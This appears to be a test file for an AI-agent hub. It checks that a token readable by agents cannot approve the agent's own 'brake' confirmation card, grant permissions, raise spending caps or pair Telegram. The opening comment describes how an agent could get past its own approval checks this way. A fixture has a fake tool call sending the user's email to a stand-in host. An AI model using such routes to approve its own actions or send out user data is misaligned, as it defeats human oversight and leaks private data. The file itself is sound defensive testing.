import { readFileSync } from 'node:fs';
import { fake } from '@monsters/providers/testing';
import { defineTool, LOGIN_EXCHANGE_PATH, LOGIN_TOKEN_PATH, type LogEvent } from '@monsters/shared';
import { describe, expect, it } from 'vitest';
import { z } from 'zod';
import { CSRF_HEADER, CSRF_HEADER_VALUE } from '../src/index.ts';
import { fakeWebSearch, startTestHub, TERMINAL_OFF, type TestHub } from './hub-helpers.ts';

/*
 * Review of 18/10, M1: the CLI token (`~/.monsters/cli-token`) is a file every process of the
 * user can read, a monster with the terminal too. With it a monster could answer its own card
 * of the brake, grant itself permissions, raise the cap, pair its own Telegram account, or open
 * a session of the UI with a login token and do the same from there. Now those need the user
 * in person: a session opened with the password (or by the app), or the user's Telegram.
 */

const EMAIL = 'giulio@example.com';
const PASSWORD = 'una password lunga';
const JSON_HEADERS = { 'content-type': 'application/json', [CSRF_HEADER]: CSRF_HEADER_VALUE };

const SHELL_FOR_RHEA = {
  agents: { rhea: { vault: true, web: true, shell: true, folders: [] } },
};

const token = (t: TestHub) => readFileSync(t.core.paths.cliToken, 'utf8').trim();

const withToken = (t: TestHub, method: string, path: string, body?: unknown) =>
  fetch(`${t.core.url}${path}`, {
    method,
    headers: { ...JSON_HEADERS, authorization: `Bearer ${token(t)}` },
    ...(body !== undefined ? { body: JSON.stringify(body) } : {}),
  });

/** A session: its cookie, and for a browser's the secret the UI sends with it (S-B13). */
type Session = Record<string, string>;

const withCookie = (t: TestHub, session: Session, method: string, path: string, body?: unknown) =>
  fetch(`${t.core.url}${path}`, {
    method,
    headers: { ...JSON_HEADERS, ...session },
    ...(body !== undefined ? { body: JSON.stringify(body) } : {}),
  });

const cookieOf = (res: Response) =>
  res.headers
    .getSetCookie()
    .map((c) => c.split(';')[0]!)
    .find((c) => c.startsWith('monsters_session='));

/** The cookie and the secret of a browser's session, from the answer of setup or login. */
async function browserSessionOf(res: Response): Promise<Session> {
  const { sessionSecret } = (await res.json()) as { sessionSecret?: string };
  return { cookie: cookieOf(res)!, 'x-monsters-session': sessionSecret ?? '' };
}

/** The account, created as on the first start (setup code), and its session. */
async function setup(t: TestHub): Promise<Session> {
  const res = await fetch(`${t.core.url}/api/setup`, {
    method: 'POST',
    headers: JSON_HEADERS,
    body: JSON.stringify({ email: EMAIL, password: PASSWORD, setupCode: t.core.setupCode }),
  });
  expect(res.status).toBe(201);
  return browserSessionOf(res);
}

/** A session opened the way the desktop app does on a core started from the terminal. */
async function mintedSession(t: TestHub): Promise<Session> {
  const minted = await withToken(t, 'POST', LOGIN_TOKEN_PATH, {});
  expect(minted.status).toBe(201);
  const { token: login } = (await minted.json()) as { token: string };
  const res = await fetch(`${t.core.url}${LOGIN_EXCHANGE_PATH}`, {
    method: 'POST',
    headers: JSON_HEADERS,
    body: JSON.stringify({ token: login }),
  });
  expect(res.status).toBe(200);
  // The desktop app's own cookie jar (D-044): the cookie alone.
  return { cookie: cookieOf(res)! };
}

describe('the CLI token is not the user in person (review of 18/10, M1)', () => {
  it('cannot answer a card of the brake, by the API nor by a message; the user can', async () => {
    let fetched = 0;
    const webFetch = defineTool({
      name: 'web_fetch',
      description: 'Reads a page.',
      inputSchema: z.object({ url: z.string() }),
      readOnly: false,
      execute: () => {
        fetched++;
        return Promise.resolve({ url: 'x', content: 'ok' });
      },
    });
    const t = await startTestHub(
      {
        rhea: [
          fake.toolCall('web_fetch', { url: 'https://raccolta.example/?d=giulio@example.com' }),
          fake.text('Fatto.'),
        ],
      },
      { hub: { webTools: [fakeWebSearch, webFetch] } },
    );
    const owner = await setup(t);
    const sent = await t.json<{ runId: string }>('POST', '/api/messages', {
      text: '@Rhea apri la pagina',
    });
    const question = await t.waitEvent(
      (e): e is LogEvent<'question'> =>
        e.type === 'question' && e.runId === sent.runId && e.data.kind === 'brake',
    );
    const id = question.data.questionId;

    // The token answers "yes" to the card: refused, the card stays open.
    const viaToken = await withToken(t, 'POST', `/api/questions/${id}/answer`, { optionId: '1' });
    expect(viaToken.status).toBe(403);
    expect(await viaToken.json()).toMatchObject({ error: 'owner_required' });
    // A session the token opened (login token) is not the user either.
    const minted = await mintedSession(t);
    const viaMinted = await withCookie(t, minted, 'POST', `/api/questions/${id}/answer`, {
      optionId: '1',
    });
    expect(viaMinted.status).toBe(403);
    // "Sì, procedi" typed through the token is a message for Rhea, not the card's answer.
    const typed = await withToken(t, 'POST', '/api/messages', { text: '@Rhea Sì, procedi' });
    expect(((await typed.json()) as { answered?: string }).answered).toBeUndefined();
    const typedInApp = await withCookie(t, minted, 'POST', '/api/messages', {
      text: '@Rhea Sì, procedi',
    });
    expect(((await typedInApp.json()) as { answered?: string }).answered).toBeUndefined();
    expect(t.core.hub.questions.get(id)?.status).toBe('open');
    expect(fetched).toBe(0);

    // The user, with the session of the password: the action goes.
    const yes = await withCookie(t, owner, 'POST', `/api/questions/${id}/answer`, {
      optionId: '1',
    });
    expect(yes.status).toBe(200);
    await t.runEnded(sent.runId);
    expect(fetched).toBe(1);
  });

  it('permissions, cap, rules, Telegram and approvals: never with the token; kill and status yes', async () => {
    // The terminal is on by default: this team has it off, and the token cannot turn it on.
    const t = await startTestHub({}, { hub: { settings: TERMINAL_OFF } });
    const owner = await setup(t);
    const minted = await mintedSession(t);
    const me = await withCookie(t, minted, 'GET', '/api/me');
    expect(await me.json()).toEqual({
      email: EMAIL,
      via: 'session',
      owner: false,
      recent: false,
    });

    const attempts: [string, string, unknown][] = [
      ['PUT', '/api/permissions', SHELL_FOR_RHEA],
      ['PUT', '/api/settings/spend', { dailyEur: 1000 }],
      ['PUT', '/api/profile', { askAlways: { extras: [], text: '' } }],
      ['PUT', '/api/settings/instinct', { uses: { outbound: 'off' } }],
      ['POST', '/api/telegram/pairing', {}],
      ['POST', '/api/drafts/automation/x/confirm', {}],
      ['POST', '/api/projects/x/confirm', {}],
      ['POST', '/api/mcp-servers/x/accept', {}],
      ['PATCH', '/api/team/agents/rhea', { web: true }],
    ];
    for (const [method, path, body] of attempts) {
      const a = await withToken(t, method, path, body);
      expect([path, a.status]).toEqual([path, 403]);
      expect(await a.json()).toMatchObject({ error: 'owner_required' });
      const b = await withCookie(t, minted, method, path, body);
      expect([path, b.status]).toEqual([path, 403]);
    }
    expect(t.core.hub.team.permissionsFor('rhea').shell).toBe(false);

    // The user in person may (here: the permissions and the pairing).
    const granted = await withCookie(t, owner, 'PUT', '/api/permissions', SHELL_FOR_RHEA);
    expect(granted.status).toBe(200);
    expect(t.core.hub.team.permissionsFor('rhea').shell).toBe(true);
    // The password typed again makes the app's session the user's ("Conferma che sei tu").
    const login = await fetch(`${t.core.url}/api/login`, {
      method: 'POST',
      headers: { ...JSON_HEADERS, ...minted },
      body: JSON.stringify({ email: EMAIL, password: PASSWORD, partitioned: true }),
    });
    expect(login.status).toBe(200);
    const stepped = { cookie: cookieOf(login)! };
    expect(await (await withCookie(t, stepped, 'GET', '/api/me')).json()).toMatchObject({
      owner: true,
    });

    // What the CLI does stays open: status, the kill switch, resume.
    expect((await withToken(t, 'GET', '/api/status')).status).toBe(200);
    expect((await withToken(t, 'POST', '/api/kill', { reason: 'prova' })).status).toBe(200);
    expect(t.core.runs.halted).toBe(true);
    expect((await withToken(t, 'POST', '/api/resume', {})).status).toBe(200);
    expect(t.core.runs.halted).toBe(false);
  });
});
